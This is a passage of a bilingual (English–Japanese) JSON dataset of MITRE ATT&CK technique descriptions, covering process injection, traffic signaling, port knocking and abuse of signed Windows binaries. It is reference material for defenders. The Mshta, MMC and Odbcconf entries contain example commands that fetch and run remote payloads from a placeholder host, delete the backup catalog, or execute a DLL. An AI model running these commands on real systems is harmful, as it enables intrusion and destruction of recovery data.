                        "id": "T1055.001",
                        "name_eng": "Dynamic-link Library Injection",
                        "name_jp": "ダイナミックリンクライブラリインジェクション",
                        "description_eng": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ダイナミックリンクライブラリ（DLL）をプロセスに注入する可能性があります。DLLインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nDLLインジェクションは一般的に、新しいスレッドを呼び出してDLLをロードする前に、ターゲットプロセスの仮想アドレス空間にDLLへのパスを書き込むことによって実行されます。書き込みは、<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>などのネイティブWindows API呼び出しで実行でき、その後<code>CreateRemoteThread</code>（DLLのロードを担当する<code>LoadLibrary</code> APIを呼び出す）で呼び出されます。(引用: Elastic Process Injection July 2017)\n\nリフレクティブDLLインジェクション（自己マッピングDLLをプロセスに書き込む）やメモリモジュール（プロセスへの書き込み時にDLLをマップする）などのこのメソッドのバリエーションは、アドレス再配置の問題や実行を呼び出すための追加のAPIを克服します（これらのメソッドは<code>LoadLibrary</code>の機能を手動で実行することによってメモリ内のファイルをロードして実行するため）。(引用: Elastic HuntingNMemory June 2017)(引用: Elastic Process Injection July 2017)\n\nモジュールストンピング/オーバーロードまたはDLLハロウイングとしばしば呼ばれるこのメソッドの別のバリエーションは、プロセス内に注入されたコードを隠蔽するために活用される可能性があります。このメソッドは、正当なDLLをリモートプロセスにロードし、ターゲットプロセスで新しいスレッドを開始する前にモジュールの<code>AddressOfEntryPoint</code>を手動で上書きすることを含みます。(引用: Module Stomping for Shellcode Injection) このバリエーションにより、攻撃者はディスク上の正当なDLLファイルで実行を潜在的にバックアップすることにより、悪意のある注入コードを隠すことができます。(引用: Hiding Malicious Code with Module Stomping)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。DLLインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.003",
                        "name_eng": "Thread Execution Hijacking",
                        "name_jp": "スレッド実行ハイジャック",
                        "description_eng": "Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、乗っ取ったプロセスに悪意のあるコードを注入する可能性があります。スレッド実行ハイジャックは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nスレッド実行ハイジャックは、通常、既存のプロセスを中断し、そのメモリをアンマップ/空洞化した後、悪意のあるコードまたはDLLへのパスに置き換えることによって実行されます。既存の被害者プロセスへのハンドルは、まず<code>OpenThread</code>などのネイティブWindows API呼び出しで作成されます。この時点で、プロセスは中断された後、書き込まれ、注入されたコードに再配置され、それぞれ<code>SuspendThread </code>、<code>VirtualAllocEx</code>、<code>WriteProcessMemory</code>、<code>SetThreadContext</code>、そして<code>ResumeThread</code>を介して再開されます。(引用: Elastic Process Injection July 2017)\n\nこれは[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と非常によく似ていますが、中断状態でプロセスを作成するのではなく、既存のプロセスをターゲットにします。\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。スレッド実行ハイジャックによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.008",
                        "name_eng": "Ptrace System Calls",
                        "name_jp": "Ptraceシステムコール",
                        "description_eng": "Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) \n\nPtrace system call injection may not be possible targeting processes that are non-child processes and/or have higher-privileges.(Citation: BH Linux Inject) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ptrace（プロセストレース）システムコールを介してプロセスに悪意のあるコードを注入する可能性があります。Ptraceシステムコールインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nPtraceシステムコールインジェクションは、実行中のプロセスにアタッチして変更することを含みます。ptraceシステムコールにより、デバッグプロセスは、メモリやレジスタ値の変更を含む、別のプロセス（および個々のスレッド）を監視および制御できます。(引用: PTRACE man) Ptraceシステムコールインジェクションは、通常、実行中のプロセスに任意のコード（例: <code>malloc</code>）を書き込み、次にそのメモリを<code>PTRACE_SETREGS</code>で呼び出して、次に実行する命令を含むレジスタを設定することによって実行されます。Ptraceシステムコールインジェクションは、<code>PTRACE_POKETEXT</code>/<code>PTRACE_POKEDATA</code>（ターゲットプロセスのメモリ内の特定のアドレス（例: 次の命令の現在のアドレス）にデータをコピーする）でも実行できます。(引用: PTRACE man)(引用: Medium Ptrace JUL 2018)\n\n非子プロセスやより高い権限を持つプロセスをターゲットとする場合、Ptraceシステムコールインジェクションは不可能である可能性があります。(引用: BH Linux Inject)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。ptraceシステムコールインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.004",
                        "name_eng": "Asynchronous Procedure Call",
                        "name_jp": "非同期手続き呼び出し",
                        "description_eng": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、非同期プロシージャコール（APC）キューを介してプロセスに悪意のあるコードを注入する可能性があります。APCインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nAPCインジェクションは、一般的に、プロセスのスレッドのAPCキュー（引用: Microsoft APC）に悪意のあるコードをアタッチすることによって実行されます。キューに入れられたAPC関数は、スレッドが変更可能な状態に入ったときに実行されます。(引用: Microsoft APC) 既存の被害者プロセスへのハンドルは、まず<code>OpenThread</code>などのネイティブWindows API呼び出しで作成されます。この時点で、<code>QueueUserAPC</code>を使用して関数（悪意のあるDLLを指す<code>LoadLibrayA</code>など）を呼び出すことができます。\n\n「アーリーバードインジェクション」と呼ばれるAPCインジェクションの変形は、プロセスのエントリポイント（および潜在的な後続のマルウェア対策フック）の前にAPCを介して悪意のあるコードを書き込んで実行できる中断プロセスを作成することを含みます。(引用: CyberBit Early Bird Apr 2018) AtomBombing（引用: ENSIL AtomBombing Oct 2016）は、以前にグローバルアトムテーブルに書き込まれた悪意のあるコードを呼び出すためにAPCを利用する別の変形です。(引用: Microsoft Atom Table)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。APCインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.002",
                        "name_eng": "Portable Executable Injection",
                        "name_jp": "ポータブル実行可能ファイルインジェクション",
                        "description_eng": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. (Citation: Elastic Process Injection July 2017) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、ポータブル実行可能ファイル（PE）をプロセスに注入する可能性があります。PEインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nPEインジェクションは、一般的に、新しいスレッドを介して呼び出す前に、コード（ディスク上のファイルなしの場合もある）をターゲットプロセスの仮想アドレス空間にコピーすることによって実行されます。書き込みは、<code>VirtualAllocEx</code>や<code>WriteProcessMemory</code>などのネイティブWindows API呼び出しで実行でき、その後<code>CreateRemoteThread</code>または追加のコード（例: シェルコード）で呼び出されます。注入されたコードの変位は、メモリ参照を再マップする機能に対する追加の要件を導入します。(引用: Elastic Process Injection July 2017)\n\n別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースへのアクセスが可能になり、場合によっては権限が昇格される可能性があります。PEインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    }
                ]
            },
            {
                "id": "T1205",
                "name_eng": "Traffic Signaling",
                "name_jp": "トラフィックシグナリング",
                "description_eng": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.\n\nAdversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.\n\nOn network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.\n\nAdversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
                "description_jp": "攻撃者は、永続化やコマンドアンドコントロールに使用されるオープンポートやその他の悪意のある機能を隠すために、トラフィックシグナリングを使用する可能性があります。トラフィックシグナリングには、クローズドポートを開いたり、悪意のあるタスクを実行したりするなど、特別な応答をトリガーするためにシステムに送信する必要があるマジックバリューまたはシーケンスの使用が含まれます。これは、攻撃者がコマンドアンドコントロールに使用できるポートが開かれる前に、特定の特性を持つ一連のパケットを送信するという形をとる場合があります。通常、この一連のパケットは、事前定義された一連のクローズドポートへの接続試行（つまり、[ポートノッキング](https://attack.mitre.org/techniques/T1205/001)）で構成されますが、異常なフラグ、特定の文字列、またはその他の固有の特性を含む場合もあります。シーケンスが完了した後、ポートを開くことはホストベースのファイアウォールによって達成される可能性がありますが、カスタムソフトウェアによって実装される可能性もあります。\n\n攻撃者はまた、既に開いているポートと通信する可能性がありますが、そのポートでリッスンしているサービスは、適切なマジックバリューが渡された場合にのみコマンドに応答したり、他の悪意のある機能をトリガーしたりします。\n\n通信をトリガーするためのシグナルパケットの監視は、さまざまな方法で行うことができます。Cd00r（引用: Hartrell cd00r 2002）によって最初に実装された1つの方法は、libpcapライブラリを使用して問題のパケットをスニッフィングすることです。別の方法は、マルウェアが他のプログラムによって既に使用されているポートを使用できるようにするローソケットを利用します。\n\nネットワークデバイスでは、攻撃者は細工されたパケットを使用して、telnetなど、デバイスが提供する標準サービスの[ネットワークデバイス認証](https://attack.mitre.org/techniques/T1556/004)を有効にする可能性があります。このようなシグナリングは、telnetなどのクローズドサービスポートを開いたり、デバイス上のマルウェアインプラントのモジュール変更をトリガーして、悪意のある機能を追加、削除、または変更したりするためにも使用される場合があります。攻撃者は、細工されたパケットを使用して1つ以上の（オープンまたはクローズド）ポートに接続しようとする可能性がありますが、目標を達成するために同じポートでルーターインターフェイス、ブロードキャスト、およびネットワークアドレスIPに接続しようとする可能性もあります。(引用: Cisco Synful Knock Evolution)(引用: Mandiant - Synful Knock)(引用: Cisco Blog Legacy Device Attacks) 組込みデバイスでこのトラフィックシグナリングを有効にするには、アーキテクチャのモノリシックな性質のため、攻撃者はまず[システムイメージのパッチ適用](https://attack.mitre.org/techniques/T1601/001)を達成して利用する必要があります。\n\n攻撃者はまた、Wake-on-LAN機能を使用して電源がオフになっているシステムをオンにする可能性があります。Wake-on-LANは、電源がオフになっているシステムにマジックパケットを送信することで電源をオンにしたり、起動したりできるハードウェア機能です。システムがオンになると、横方向の移動のターゲットになる可能性があります。(引用: Bleeping Computer - Ryuk WoL)(引用: AMD Magic Packet)",
                "subtechniques": [
                    {
                        "id": "T1205.001",
                        "name_eng": "Port Knocking",
                        "name_jp": "ポートノッキング",
                        "description_eng": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.\n\nThis technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
                        "description_jp": "攻撃者は、永続化やコマンドアンドコントロールに使用されるオープンポートを隠すためにポートノッキングを使用する可能性があります。ポートを有効にするために、攻撃者は事前定義された一連のクローズドポートへの一連の接続試行を送信します。シーケンスが完了した後、ポートを開くことはホストベースのファイアウォールによって行われることが多いですが、カスタムソフトウェアによって実装される可能性もあります。\n\nこのテクニックは、リスニングポートの動的なオープンと、別のシステム上のリスニングサーバーへの接続の開始の両方で観察されています。\n\n通信をトリガーするためのシグナルパケットの監視は、さまざまな方法で行うことができます。Cd00r（引用: Hartrell cd00r 2002）によって最初に実装された1つの方法は、libpcapライブラリを使用して問題のパケットをスニッフィングすることです。別の方法は、マルウェアが他のプログラムによって既に使用されているポートを使用できるようにするローソケットを利用します。"
                    },
                    {
                        "id": "T1205.002",
                        "name_eng": "Socket Filters",
                        "name_jp": "ソケットフィルター",
                        "description_eng": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                        "description_jp": "攻撃者は、永続化やコマンドアンドコントロールに使用されるバックドアを監視してからアクティブ化するために、ネットワークソケットにフィルターをアタッチする可能性があります。昇格された権限を持つ攻撃者は、<code>libpcap</code>ライブラリなどの機能を使用してソケットを開き、特定の種類のデータがソケットを通過することを許可または不許可にするフィルターをインストールできます。フィルターは、指定されたネットワークインターフェイス（または指定されていない場合はすべてのインターフェイス）を通過するすべてのトラフィックに適用される場合があります。ネットワークインターフェイスがフィルター条件に一致するパケットを受信すると、リバースシェルのアクティブ化など、ホストで追加のアクションをトリガーできます。\n\n接続を確立するために、攻撃者はインストールされたフィルター条件に一致する細工されたパケットをターゲットホストに送信します。(引用: haking9 libpcap network sniffing) 攻撃者はこれらのソケットフィルターを使用して、インプラントのインストールをトリガーしたり、ピングバックを実行したり、コマンドシェルを呼び出したりしています。これらのソケットフィルターとの通信は、[プロトコルトンネリング](https://attack.mitre.org/techniques/T1572)と組み合わせて使用される場合もあります。(引用: exatrack bpf filters passive backdoors)(引用: Leonardo Turla Penquin May 2020)\n\nフィルターは、<code>libpcap</code>がインストールされているUnixライクなプラットフォーム、または<code>Winpcap</code>を使用しているWindowsホストにインストールできます。攻撃者は、<code>libpcap</code>と<code>pcap_setfilter</code>を使用するか、標準ライブラリ関数<code>setsockopt</code>と<code>SO_ATTACH_FILTER</code>オプションを使用する場合があります。パケットが受信されるまでソケット接続はアクティブではないため、ホストでのアクティビティの欠如、低いCPUオーバーヘッド、およびローソケット使用状況への限定的な可視性により、この動作を検出することは困難な場合があります。"
                    }
                ]
            },
            {
                "id": "T1218",
                "name_eng": "System Binary Proxy Execution",
                "name_jp": "システムバイナリプロキシ実行",
                "description_eng": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.\n\nSimilarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",
                "description_jp": "攻撃者は、署名付きまたはその他の信頼できるバイナリで悪意のあるコンテンツの実行をプロキシすることにより、プロセスベースおよび/または署名ベースの防御をバイパスする可能性があります。このテクニックで使用されるバイナリは、多くの場合Microsoft署名ファイルであり、Microsoftからダウンロードされたか、オペレーティングシステムに既にネイティブであることを示しています。(引用: LOLBAS Project) 信頼できるデジタル証明書で署名されたバイナリは、通常、デジタル署名検証によって保護されているWindowsシステムで実行できます。Windowsインストール時にデフォルトで含まれるいくつかのMicrosoft署名バイナリは、他のファイルやコマンドの実行をプロキシするために使用できます。\n\n同様に、Linuxシステムでは、攻撃者は<code>split</code>などの信頼できるバイナリを悪用して、悪意のあるコマンドの実行をプロキシする可能性があります。(引用: split man page)(引用: GTFO split)",
                "subtechniques": [
                    {
                        "id": "T1218.005",
                        "name_eng": "Mshta",
                        "name_jp": "Mshta",
                        "description_eng": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)",
                        "description_jp": "攻撃者はmshta.exeを悪用して、信頼できるWindowsユーティリティを介して悪意のある.htaファイルやJavascriptまたはVBScriptの実行をプロキシする可能性があります。初期侵害時やコード実行時にmshta.exeを利用するさまざまな種類の脅威の例がいくつかあります。(引用: Cylance Dust Storm) (引用: Red Canary HTA Abuse Part Deux) (引用: FireEye Attacks Leveraging HTA) (引用: Airbus Security Kovter Analysis) (引用: FireEye FIN7 April 2017)\n\nMshta.exeは、Microsoft HTMLアプリケーション（HTA）ファイルを実行するユーティリティです。(引用: Wikipedia HTML Application) HTAは、Internet Explorerと同じモデルとテクノロジを使用して実行されますが、ブラウザの外部で実行されるスタンドアロンアプリケーションです。(引用: MSDN HTML Applications)\n\nファイルは、インラインスクリプトを介してmshta.exeによって実行される場合があります：<code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nURLから直接実行することもできます：<code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exeは、その潜在的な使用を考慮していないアプリケーション制御ソリューションをバイパスするために使用できます。mshta.exeはInternet Explorerのセキュリティコンテキストの外部で実行されるため、ブラウザのセキュリティ設定もバイパスします。(引用: LOLBAS Mshta)"
                    },
                    {
                        "id": "T1218.014",
                        "name_eng": "MMC",
                        "name_jp": "MMC",
                        "description_eng": "Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.(Citation: win_mmc)(Citation: what_is_mmc) MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.(Citation: win_msc_files_overview)\n\nFor example, <code>mmc C:\\Users\\foo\\admintools.msc /a</code> will open a custom, saved console msc file in author mode.(Citation: win_mmc) Another common example is <code>mmc gpedit.msc</code>, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, <code>mmc wbadmin.msc delete catalog -quiet</code> deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: <code>wbadmin.msc</code> may only be present by default on Windows Server operating systems).(Citation: win_wbadmin_delete_catalog)(Citation: phobos_virustotal)\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.(Citation: win_clsid_key) Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.(Citation: mmc_vulns) Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: <code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>.(Citation: abusing_com_reg)",
                        "description_jp": "攻撃者はmmc.exeを悪用して、悪意のある.mscファイルの実行をプロキシする可能性があります。Microsoft Management Console（MMC）は、Microsoftによって署名されている可能性のあるバイナリであり、GUIまたはコマンドプロンプトでいくつかの方法で使用されます。(引用: win_mmc)(引用: what_is_mmc) MMCは、Microsoftによって作成された管理ツール（スナップインと呼ばれる）を含むカスタムコンソールを作成、オープン、および保存するために使用できます。これらのスナップインは、Windowsシステムをローカルまたはリモートで管理するために使用できます。MMCはまた、システム構成を管理するためにMicrosoftが作成した.mscファイルを開くためにも使用できます。(引用: win_msc_files_overview)\n\n例えば、<code>mmc C:\\Users\\foo\\admintools.msc /a</code>は、カスタムの保存済みコンソールmscファイルを作成者モードで開きます。(引用: win_mmc) もう1つの一般的な例は<code>mmc gpedit.msc</code>で、これはグループポリシーエディターアプリケーションウィンドウを開きます。\n\n攻撃者はMMCコマンドを使用して悪意のあるタスクを実行する可能性があります。例えば、<code>mmc wbadmin.msc delete catalog -quiet</code>は、ユーザーへのプロンプトなしにシステム上のバックアップカタログを削除します（つまり、[システム回復の阻害](https://attack.mitre.org/techniques/T1490)）（注：<code>wbadmin.msc</code>はデフォルトではWindows Serverオペレーティングシステムにのみ存在する場合があります）。(引用: win_wbadmin_delete_catalog)(引用: phobos_virustotal)\n\n攻撃者はまた、MMCを悪用して悪意のある.mscファイルを実行する可能性があります。例えば、攻撃者はまず、[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)クラスオブジェクトを一意に識別する悪意のあるレジストリクラス識別子（CLSID）サブキーを作成する可能性があります。(引用: win_clsid_key) 次に、攻撃者は悪意のあるCLSIDサブキーにリンクされた「Webアドレスへのリンク」スナップインを含むカスタムコンソールを作成する可能性があります。(引用: mmc_vulns) .mscファイルが保存されると、攻撃者は次のコマンドで悪意のあるCLSIDペイロードを呼び出す可能性があります：<code>mmc.exe -Embedding C:\\path\\to\\test.msc</code>。(引用: abusing_com_reg)"
                    },
                    {
                        "id": "T1218.008",
                        "name_eng": "Odbcconf",
                        "name_jp": "Odbcconf",
                        "description_eng": "Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.(Citation: Microsoft odbcconf.exe) The Odbcconf.exe binary may be digitally signed by Microsoft.\n\nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR \"C:\\Users\\Public\\file.dll\"&rbrace;</code>). (Citation: LOLBAS Odbcconf)(Citation: TrendMicro Squiblydoo Aug 2017)(Citation: TrendMicro Cobalt Group Nov 2017)",
